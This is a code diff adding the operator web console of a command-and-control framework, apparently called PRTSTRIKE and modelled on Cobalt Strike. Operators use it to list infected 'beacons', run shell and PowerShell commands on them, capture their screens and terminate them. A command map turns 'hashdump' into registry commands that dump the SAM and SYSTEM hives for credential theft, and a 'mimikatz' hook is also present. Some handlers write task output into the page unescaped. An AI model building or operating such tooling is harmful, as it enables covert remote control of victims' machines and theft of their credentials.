+            sessionStorage.removeItem('justLoggedIn');
+
+            if (justLoggedIn === 'true') {
+                // 稍作停留，让用户感觉到黑幕是从 index.php 延续过来的
+                setTimeout(() => {
+                    revealPage();
+                    fetchUserInfo();
+                    initWebSocket();
+
+                    // 默认加载 welcome 模块
+                    loadModule('welcome');
+
+                    fetchClients();
+                    // 定期刷新客户端列表
+                    setInterval(fetchClients, 10000);
+                }, 500); // 增加衔接时长，与 index.html 的 1800ms 呼应
+                
+                // 如果 3 秒后还没 load 完，强制显示
+                setTimeout(revealPage, 1500);
+            } else {
+                // 直接显示，跳过动画
+                const overlay = document.getElementById('entrance-overlay');
+                if (overlay) {
+                    overlay.style.transition = 'none';
+                    overlay.style.display = 'none';
+                }
+                document.body.classList.add('revealed');
+                
+                fetchUserInfo();
+                initWebSocket();
+                loadModule('welcome');
+                fetchClients();
+                setInterval(fetchClients, 10000);
+            }
+        });
+
+
+        // 交互逻辑
+        const modal = document.getElementById('interact-modal');
+        const closeBtn = document.getElementById('close-modal');
+
+        let currentBeaconIp = '';
+        let currentBeaconId = '';
+
+        function openInteract(ip) {
+            currentBeaconIp = ip;
+            document.getElementById('target-id').innerText = ip;
+            modal.style.display = 'flex';
+            // Clear previous output
+            const output = document.getElementById('interact-output');
+            if (output) output.innerHTML = `<div style="color:var(--success);">[*] Session opened with ${ip}</div><div style="color:#888;">[*] Type commands below. Results will appear here.</div><br>`;
+            document.getElementById('interact-cmd').focus();
+        }
+
+        // Handle interact command input
+        const interactInput = document.getElementById('interact-cmd');
+        if (interactInput) {
+            interactInput.addEventListener('keydown', async function(e) {
+                if (e.key === 'Enter') {
+                    const cmd = this.value.trim();
+                    if (!cmd || !currentBeaconId) return;
+                    this.value = '';
+
+                    const output = document.getElementById('interact-output');
+                    // Echo command
+                    output.innerHTML += `<div style="color:#fff;">prtshell > ${cmd}</div>`;
+                    output.scrollTop = output.scrollHeight;
+
+                    // Send via REST API
+                    try {
+                        const resp = await fetch('/api/tasks', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                            body: JSON.stringify({ client_id: currentBeaconId, command: cmd })
+                        });
+                        const result = await resp.json();
+                        if (result.status === 'success' && result.data && result.data.id) {
+                            output.innerHTML += `<div style="color:#888;">[*] Task queued: ${result.data.id} - polling for result...</div>`;
+                            output.scrollTop = output.scrollHeight;
+                            // Poll for result
+                            pollTaskResult(result.data.id, output);
+                        } else {
+                            output.innerHTML += `<div style="color:var(--success);">${result.message || 'OK'}</div>`;
+                            output.scrollTop = output.scrollHeight;
+                        }
+                    } catch(err) {
+                        output.innerHTML += `<div style="color:#f44336;">[!] Error: ${err.message}</div>`;
+                        output.scrollTop = output.scrollHeight;
+                    }
+                }
+            });
+        }
+
+        async function pollTaskResult(taskId, outputEl, retries = 30) {
+            for (let i = 0; i < retries; i++) {
+                await new Promise(r => setTimeout(r, 2000));
+                try {
+                    const resp = await fetch('/api/tasks?client_id=' + currentBeaconId, { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+                    const result = await resp.json();
+                    const task = (result.data || []).find(t => t.id === taskId);
+                    if (task && task.status === 'completed') {
+                        if (task.result && task.result.startsWith('SCREENSHOT:')) {
+                            const b64 = task.result.substring(11);
+                            const isBmp = b64.startsWith('Qk'); // BMP magic "BM" in base64
+                            const mime = isBmp ? 'image/bmp' : 'image/png';
+                            outputEl.innerHTML += `<div style="margin:8px 0;">
+                                <div style="color:var(--accent);margin-bottom:6px;font-family:'JetBrains Mono';font-size:11px;">[+] Screenshot captured</div>
+                                <img src="data:${mime};base64,${b64}" style="max-width:100%;border:1px solid var(--border);cursor:pointer;" onclick="window.open(this.src,'_blank')" title="Click to open full size">
+                            </div><br>`;
+                        } else {
+                            outputEl.innerHTML += `<div style="color:#eee; white-space:pre-wrap; font-family:'JetBrains Mono';">${task.result || '(no output)'}</div><br>`;
+                        }
+                        outputEl.scrollTop = outputEl.scrollHeight;
+                        return;
+                    } else if (task && task.status === 'failed') {
+                        outputEl.innerHTML += `<div style="color:#f44336;">[!] Task failed: ${task.result || 'unknown error'}</div><br>`;
+                        outputEl.scrollTop = outputEl.scrollHeight;
+                        return;
+                    }
+                } catch(e) {}
+            }
+            outputEl.innerHTML += `<div style="color:#ff9800;">[!] Task timeout - result not received within polling window</div><br>`;
+            outputEl.scrollTop = outputEl.scrollHeight;
+        }
+
+        async function sendQuickCommand(action, clientId) {
+            try {
+                const resp = await fetch('/api/quick-command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                    body: JSON.stringify({ client_id: clientId, action: action })
+                });
+                const result = await resp.json();
+                if (result.status === 'success') {
+                    appendLog('TASK', `[${action.toUpperCase()}] ${result.message} -> ${clientId}`, 'success');
+                    showNotification(`${action.toUpperCase()} task queued for ${clientId}`);
+                } else {
+                    showNotification('ERROR: ' + result.message);
+                }
+            } catch(e) {
+                showNotification('ERROR: ' + e.message);
+            }
+        }
+
+
+
+        // Screenshot from beacon list
+        async function takeScreenshot(clientId) {
+            try {
+                showNotification('SCREENSHOT task queued for ' + clientId);
+                const resp = await fetch('/api/screenshot?client_id=' + clientId, { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+                const result = await resp.json();
+                if (result.status === 'success' && result.data && result.data.task_id) {
+                    appendLog('TASK', `[SCREENSHOT] ${result.message} -> ${clientId}`, 'success');
+                    pollScreenshotResult(result.data.task_id, clientId);
+                } else {
+                    showNotification('ERROR: ' + (result.message || 'unknown'));
+                }
+            } catch(e) { showNotification('ERROR: ' + e.message); }
+        }
+
+        async function pollScreenshotResult(taskId, clientId, retries = 60) {
+            for (let i = 0; i < retries; i++) {
+                await new Promise(r => setTimeout(r, 2000));
+                try {
+                    const resp = await fetch('/api/tasks?client_id=' + clientId, { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+                    const result = await resp.json();
+                    const task = (result.data || []).find(t => t.id === taskId);
+                    if (task && task.status === 'completed' && task.result) {
+                        if (task.result.startsWith('SCREENSHOT:')) {
+                            const b64 = task.result.substring(11);
+                            const isBmp = b64.startsWith('Qk');
+                            const mime = isBmp ? 'image/bmp' : 'image/png';
+                            const html = `
+                            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);backdrop-filter:blur(10px);z-index:2001;display:flex;align-items:center;justify-content:center;flex-direction:column;" onclick="if(event.target===this)this.remove()">
+                                <div style="margin-bottom:10px;font-family:'JetBrains Mono';font-size:11px;color:var(--accent);">SCREENSHOT // ${clientId} // ${new Date().toLocaleString()}</div>
+                                <img src="data:${mime};base64,${b64}" style="max-width:90vw;max-height:85vh;border:1px solid var(--border);cursor:pointer;" onclick="window.open(this.src,'_blank')" title="Click to open full size">
+                                <div style="margin-top:10px;font-family:'JetBrains Mono';font-size:10px;color:#666;">Click image to open full size | Click outside to close</div>
+                            </div>`;
+                            document.body.insertAdjacentHTML('beforeend', html);
+                            showNotification('Screenshot received from ' + clientId);
+                        } else {
+                            showNotification('Screenshot error: ' + task.result.substring(0, 100));
+                        }
+                        return;
+                    } else if (task && task.status === 'failed') {
+                        showNotification('Screenshot failed: ' + (task.result || 'unknown'));
+                        return;
+                    }
+                } catch(e) {}
+            }
+            showNotification('Screenshot timeout - no result received');
+        }
+
+        // Beacon Detail Panel
+        async function showBeaconDetail(id) {
+            try {
+                const resp = await fetch('/api/clients/' + id, { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+                const result = await resp.json();
+                if (result.status !== 'success') return;
+                const c = result.data.client;
+                const tc = result.data.task_count;
+
+                const adminStr = c.is_admin ? '<span style="color:#ff9800;">YES (Elevated)</span>' : '<span style="color:#888;">NO</span>';
+                const statusColor = c.status === 'online' ? 'var(--success)' : (c.status === 'offline' ? 'var(--danger)' : '#ff3b30');
+
+                const html = `
+                <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);z-index:2001;display:flex;align-items:center;justify-content:center;" onclick="if(event.target===this)this.remove()">
+                    <div style="width:600px;background:#0a0a0a;border:1px solid var(--accent);max-height:80vh;overflow-y:auto;">
+                        <div style="padding:15px 20px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;">
+                            <span style="font-family:'Syncopate';font-size:13px;color:var(--accent);letter-spacing:2px;">BEACON_DETAIL</span>
+                            <span style="cursor:pointer;color:var(--accent);font-size:20px;" onclick="this.closest('[style*=fixed]').remove()">&times;</span>
+                        </div>
+                        <div style="padding:20px;font-family:'JetBrains Mono';font-size:11px;">
+                            <div style="display:grid;grid-template-columns:140px 1fr;gap:8px 15px;">
+                                <span style="color:#666;">BEACON_ID:</span><span style="color:var(--accent);">${c.id}</span>
+                                <span style="color:#666;">STATUS:</span><span style="color:${statusColor};font-weight:bold;">${c.status.toUpperCase()}</span>
+                                <span style="color:#666;">HOSTNAME:</span><span>${c.hostname || '-'}</span>
+                                <span style="color:#666;">USERNAME:</span><span>${c.username || '-'}</span>
+                                <span style="color:#666;">DOMAIN:</span><span>${c.domain || '-'}</span>
+                                <span style="color:#666;">EXTERNAL_IP:</span><span>${c.ip}</span>
+                                <span style="color:#666;">INTERNAL_IP:</span><span>${c.internal_ip || '-'}</span>
+                                <span style="color:#666;">OS:</span><span>${c.os}</span>
+                                <span style="color:#666;">ARCH:</span><span>${c.arch || '-'}</span>
+                                <span style="color:#666;">PID:</span><span>${c.pid || '-'}</span>
+                                <span style="color:#666;">PROCESS:</span><span>${c.process_name || '-'}</span>
+                                <span style="color:#666;">ADMIN:</span><span>${adminStr}</span>
+                                <span style="color:#666;">SLEEP:</span><span>${c.sleep}s / ${c.jitter}%</span>
+                                <span style="color:#666;">FIRST_SEEN:</span><span>${new Date(c.first_seen).toLocaleString()}</span>
+                                <span style="color:#666;">LAST_CHECK:</span><span>${formatLastSeen(c.last_check)}</span>
+                                <span style="color:#666;">GROUP:</span><span>${c.group || 'default'}</span>
+                                <span style="color:#666;">NOTE:</span><span>${c.note || '-'}</span>
+                            </div>
+                            <div style="margin-top:15px;padding-top:15px;border-top:1px solid var(--border);display:flex;gap:20px;">
+                                <span style="color:#666;">Tasks: <span style="color:#fff;">${tc}</span></span>
+                            </div>
+                            <div style="margin-top:15px;display:flex;gap:10px;">
+                                <button class="btn-primary" style="font-size:10px;padding:6px 12px;" onclick="selectBeacon('${c.id}','${c.ip}');this.closest('[style*=fixed]').remove();document.getElementById('console-cmd').focus()">
+                                    <i class="fas fa-terminal"></i> INTERACT
+                                </button>
+                                <button class="btn-primary" style="font-size:10px;padding:6px 12px;" onclick="promptEditNote('${c.id}')">
+                                    <i class="fas fa-edit"></i> EDIT NOTE
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>`;
+                document.body.insertAdjacentHTML('beforeend', html);
+            } catch(e) { showNotification('ERROR: ' + e.message); }
+        }
+
+        function promptEditNote(id) {
+            const note = prompt('Enter note for this beacon:');
+            if (note === null) return;
+            const group = prompt('Enter group tag (or leave empty):') || '';
+            fetch('/api/clients/' + id, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                body: JSON.stringify({ note: note, group: group })
+            }).then(r => r.json()).then(res => {
+                showNotification(res.message);
+                fetchClients();
+            });
+        }
+
+        // New beacon notification handler
+        function handleNewBeaconEvent(data) {
+            const host = data.hostname || data.ip || 'unknown';
+            const user = data.username || '';
+            const admin = data.is_admin ? ' [ADMIN]' : '';
+            showNotification(`NEW BEACON: ${user}@${host}${admin} (${data.os || ''})`);
+            appendLog('C2', `NEW_BEACON: ${user}@${host} from ${data.ip}${admin}`, 'success');
+            fetchClients();
+        }
+
+        // Toggle console
+        function toggleConsole() {
+            const bc = document.querySelector('.bottom-console');
+            if (bc) bc.classList.toggle('collapsed');
+        }
+
+        // 简易通知函数
+        function showNotification(msg) {
+            console.log(msg);
+            const bc = document.getElementById('bottom-console');
+            const bottomOffset = bc ? bc.offsetHeight + 10 : 30;
+            const toast = document.createElement('div');
+            toast.style.cssText = `position:fixed; bottom:${bottomOffset}px; right:20px; background:rgba(0,0,0,0.9); border-left:4px solid var(--accent); color:var(--accent); padding:12px 20px; z-index:3001; font-family:"JetBrains Mono",monospace; font-size:11px; backdrop-filter:blur(10px); border:1px solid rgba(125,142,142,0.3); max-width:400px; animation:toastIn 0.3s ease-out;`;
+            toast.innerHTML = `<span style="color:var(--success); margin-right:8px;">></span> ${msg}`;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+
+
+        // 点击处理 - 只在点击 beacons 列表空白处时取消选择，不影响其他模块操作
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('.beacon-row') ||
+                e.target.closest('.modal-overlay') || e.target.closest('.nav-item') ||
+                e.target.closest('.bottom-console') || e.target.closest('button') ||
+                e.target.closest('input') || e.target.closest('select') ||
+                e.target.closest('a')) {
+                return; // Don't deselect when interacting with UI elements
+            }
+        });
+
+        closeBtn.onclick = () => {
+            modal.style.display = 'none';
+        };
+
+        window.onclick = (event) => {
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+
+        };
+
+        // 页面切换逻辑
+        const navItems = document.querySelectorAll('.nav-item[data-page]');
+
+        navItems.forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                const moduleName = item.getAttribute('data-page');
+
+                // 切换导航激活状态
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+
+                // 动态加载模块
+                loadModule(moduleName);
+            });
+        });
+
+
+        // === CobaltStrike-Style Beacon Console ===
+        const cmdHistory = [];
+        let historyIdx = -1;
+
+        const HELP_TEXT = `
+<div style="padding:4px 0;white-space:pre;font-family:'JetBrains Mono', monospace;line-height:1.4;">
+<span style="color:var(--accent);font-weight:bold;font-size:13px;letter-spacing:3px;">PRTSTRIKE C2 FRAMEWORK</span>
+<span style="color:var(--text-dim);font-size:10px;letter-spacing:1px;">v1.0 // TACTICAL OPERATOR CONSOLE</span>
+<span style="color:var(--accent);">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span style="color:var(--accent-alt);font-weight:bold;letter-spacing:2px;">  EXECUTION</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">shell</span> <span style="color:var(--text-dim);">&lt;cmd&gt;</span>          <span style="color:var(--text-dim);">Execute shell command on target</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">run</span> <span style="color:var(--text-dim);">&lt;cmd&gt;</span>            <span style="color:var(--text-dim);">Alias for shell</span>
+<span style="color:var(--text-dim);">  └─</span> <span style="color:var(--success);">powershell</span> <span style="color:var(--text-dim);">&lt;cmd&gt;</span>     <span style="color:var(--text-dim);">Execute PowerShell command</span>
+
+<span style="color:var(--accent-alt);font-weight:bold;letter-spacing:2px;">  RECON</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">sysinfo</span>               <span style="color:var(--text-dim);">System information</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">whoami</span>                <span style="color:var(--text-dim);">Current user & privileges</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">ps</span>                    <span style="color:var(--text-dim);">List running processes</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">ipconfig</span>              <span style="color:var(--text-dim);">Network interfaces</span>
+<span style="color:var(--text-dim);">  └─</span> <span style="color:var(--success);">netstat</span>               <span style="color:var(--text-dim);">Active connections</span>
+
+<span style="color:var(--accent-alt);font-weight:bold;letter-spacing:2px;">  FILE SYSTEM</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">pwd</span>                   <span style="color:var(--text-dim);">Print working directory</span>
+<span style="color:var(--text-dim);">  └─</span> <span style="color:var(--success);">cd</span> <span style="color:var(--text-dim);">&lt;path&gt;</span>             <span style="color:var(--text-dim);">Change working directory</span>
+
+<span style="color:var(--accent-alt);font-weight:bold;letter-spacing:2px;">  COLLECTION</span>
+<span style="color:var(--text-dim);">  └─</span> <span style="color:var(--success);">screenshot</span>            <span style="color:var(--text-dim);">Capture target screen</span>
+
+<span style="color:var(--accent-alt);font-weight:bold;letter-spacing:2px;">  SESSION</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">sleep</span> <span style="color:var(--text-dim);">&lt;s&gt; [j%]</span>       <span style="color:var(--text-dim);">Set callback interval & jitter</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">note</span> <span style="color:var(--text-dim);">&lt;text&gt;</span>           <span style="color:var(--text-dim);">Set beacon note</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">kill</span>                  <span style="color:var(--text-dim);">Terminate beacon process</span>
+<span style="color:var(--text-dim);">  ├─</span> <span style="color:var(--success);">clear</span>                 <span style="color:var(--text-dim);">Clear console output</span>
+<span style="color:var(--text-dim);">  └─</span> <span style="color:var(--success);">help</span>                  <span style="color:var(--text-dim);">Show this help</span>
+
+<span style="color:var(--accent);">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span style="color:var(--text-dim);font-style:italic;">  Select a beacon first, then type commands.</span>
+<span style="color:var(--text-dim);font-style:italic;">  Without a beacon selected, input is sent as operator chat.</span>
+</div>`;
+
+        function appendRaw(html) {
+            const container = document.getElementById('console-output');
+            if (!container) return;
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = html;
+            container.appendChild(entry);
+            while (container.children.length > state.maxLogs) container.firstChild.remove();
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // Map short commands to actual commands to send to beacon
+        function resolveBeaconCommand(input) {
+            const lower = input.toLowerCase().trim();
+            const parts = input.trim().split(/\s+/);
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1).join(' ');
+
+            // Commands that need "shell" prefix stripped or mapped
+            const directCmds = {
+                'sysinfo': 'systeminfo',
+                'ps': 'ps',
+                'pwd': 'pwd',
+                'whoami': 'whoami',
+                'ipconfig': 'ipconfig',
+                'ifconfig': 'ifconfig',
+                'netstat': 'netstat -ano',
+                'screenshot': '__SCREENSHOT__',
+                'hashdump': 'reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv',
+                'mimikatz': '__MIMIKATZ__',
+            };
+
+            if (cmd === 'shell' || cmd === 'run') {
+                return { type: 'task', command: args || 'echo no command specified' };
+            }
+            if (cmd === 'powershell' || cmd === 'psh') {
+                return { type: 'task', command: args };
+            }
+            if (cmd === 'sleep' || cmd === 'delay') {
+                return { type: 'local', command: input };
+            }
+            if (cmd === 'note') {
+                return { type: 'local', command: input };
+            }
+            if (cmd === 'cd') {
+                return { type: 'task', command: input };
+            }
+            if (cmd === 'kill') {
+                return { type: 'kill' };
+            }
+            if (directCmds[cmd]) {
+                return { type: 'task', command: directCmds[cmd] };
+            }
+            // Default: treat as shell command
+            return { type: 'task', command: input };
+        }
+
+        async function sendBeaconTask(command) {
+            try {
+                const resp = await fetch('/api/tasks', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+                    body: JSON.stringify({ client_id: currentBeaconId, command: command })
+                });
+                const result = await resp.json();
+                if (result.status === 'success' && result.data && result.data.id) {
+                    appendLog('TASK', `Tasked beacon (${result.data.id})`, 'success');
+                    // Auto-poll for result in console
+                    pollConsoleResult(result.data.id);
+                } else if (result.message) {
+                    appendLog('INFO', result.message, 'success');
+                }
+            } catch(err) {
+                appendLog('ERROR', 'Request failed: ' + err.message, 'error');
+            }
+        }
+
+        async function pollConsoleResult(taskId) {
+            for (let i = 0; i < 60; i++) {
+                await new Promise(r => setTimeout(r, 2000));
+                try {
+                    const resp = await fetch('/api/tasks?client_id=' + currentBeaconId, {
+                        headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                    });
+                    const result = await resp.json();
+                    const task = (result.data || []).find(t => t.id === taskId);
+                    if (task && task.status === 'completed') {
+                        if (task.result && task.result.startsWith('SCREENSHOT:')) {
+                            const b64 = task.result.substring(11);
+                            const isBmp = b64.startsWith('Qk');
+                            const mime = isBmp ? 'image/bmp' : 'image/png';
+                            appendRaw(`<span class="log-time">[${new Date().toLocaleTimeString('en-GB',{hour12:false})}]</span> <span class="log-tag" style="color:var(--success);">[SCREENSHOT]</span><div style="margin:6px 0;"><img src="data:${mime};base64,${b64}" style="max-width:100%;max-height:400px;border:1px solid var(--border);cursor:pointer;" onclick="window.open(this.src,'_blank')" title="Click to open full size"></div>`);
+                        } else {
+                            const output = (task.result || '(empty)').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                            appendRaw(`<span class="log-time">[${new Date().toLocaleTimeString('en-GB',{hour12:false})}]</span> <span class="log-tag" style="color:var(--success);">[RESULT]</span> <span class="log-msg" style="color:#ccc;"><pre style="margin:0;font-family:inherit;white-space:pre-wrap;">${output}</pre></span>`);
+                        }
+                        return;
+                    }
+                    if (task && task.status === 'failed') {
+                        appendLog('ERROR', `Task ${taskId} failed: ${task.result || 'unknown'}`, 'error');
+                        return;
+                    }
+                } catch(e) {}
+            }
+            appendLog('WARN', `Task ${taskId} timed out (120s)`, 'warning');
+        }
+
+        const consoleInput = document.getElementById('console-cmd');
+        if (consoleInput) {
+            consoleInput.addEventListener('keydown', async function(e) {
+                if (e.key === 'ArrowUp') {
+                    e.preventDefault();
+                    if (cmdHistory.length > 0) {
+                        historyIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
+                        this.value = cmdHistory[historyIdx];
+                    }
+                    return;
+                }
+                if (e.key === 'ArrowDown') {
+                    e.preventDefault();
+                    historyIdx = Math.max(historyIdx - 1, -1);
+                    this.value = historyIdx >= 0 ? cmdHistory[historyIdx] : '';
+                    return;
+                }
+                if (e.key === 'Enter') {
+                    const val = this.value.trim();
+                    if (!val) return;
+                    this.value = '';
+                    cmdHistory.unshift(val);
+                    if (cmdHistory.length > 50) cmdHistory.pop();
+                    historyIdx = -1;
+
+                    const promptStr = currentBeaconId ? `beacon (${currentBeaconIp})` : 'prts';
+
+                    // Local commands (no beacon needed)
+                    if (val.toLowerCase() === 'help' || val === '?') {
+                        appendRaw(HELP_TEXT);
+                        return;
+                    }
+                    if (val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') {
+                        document.getElementById('console-output').innerHTML = '';
+                        return;
+                    }
+                    if (val.toLowerCase() === 'sessions' || val.toLowerCase() === 'beacons') {
+                        const list = (state.clients || []).map(c =>
+                            `  ${c.id.substring(0,16)}  ${c.status.padEnd(8)}  ${(c.username||'-').padEnd(15)}  ${(c.hostname||'-').padEnd(15)}  ${c.ip}`
+                        ).join('\n');
+                        appendRaw(`<span class="log-msg" style="color:#ccc;"><pre style="margin:0;font-family:inherit;white-space:pre-wrap;">${list || '  No active beacons'}</pre></span>`);
+                        return;
+                    }
+
+                    // Echo command
+                    appendLog('CMD', `${promptStr} > ${val}`, 'info');
+
+                    if (!currentBeaconId) {
+                        // No beacon selected: try to select by partial ID
+                        if (val.toLowerCase().startsWith('interact ')) {
+                            const targetId = val.substring(9).trim();
+                            const found = (state.clients || []).find(c =>
+                                c.id.startsWith(targetId) || c.hostname === targetId || c.ip === targetId
+                            );
+                            if (found) {
+                                selectBeacon(found.id, found.ip);
+                                appendLog('INFO', `Interacting with beacon ${found.id} (${found.hostname || found.ip})`, 'success');
+                            } else {
+                                appendLog('ERROR', `Beacon not found: ${targetId}`, 'error');
+                            }
+                            return;
+                        }
+                        // Chat mode: no beacon selected, send as operator chat via WS
+                        if (state.ws && state.ws.readyState === WebSocket.OPEN) {
+                            state.ws.send(JSON.stringify({ type: 'chat', content: val }));
+                        } else {
+                            appendLog('CHAT', `[${state.username}] ${val}`, 'info');
+                        }
+                        return;
+                    }
+
+                    // Beacon-targeted commands
+                    const resolved = resolveBeaconCommand(val);
+
+                    if (resolved.type === 'kill') {
+                        if (!confirm(`TERMINATE beacon ${currentBeaconId}?`)) return;
+                        fetch('/api/clients/' + currentBeaconId + '/kill', {
+                            method: 'POST', headers: { 'X-Requested-With': 'XMLHttpRequest' }
+                        }).then(r => r.json()).then(res => {
+                            appendLog('C2', 'Kill signal sent: ' + res.message, 'warning');
+                            fetchClients();
+                        });
+                        return;
+                    }
+
+                    if (resolved.type === 'local') {
+                        // sleep, note - handled by processCommand on server
+                        sendBeaconTask(resolved.command);
+                        return;
+                    }
+
+                    // type === 'task'
+                    sendBeaconTask(resolved.command);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
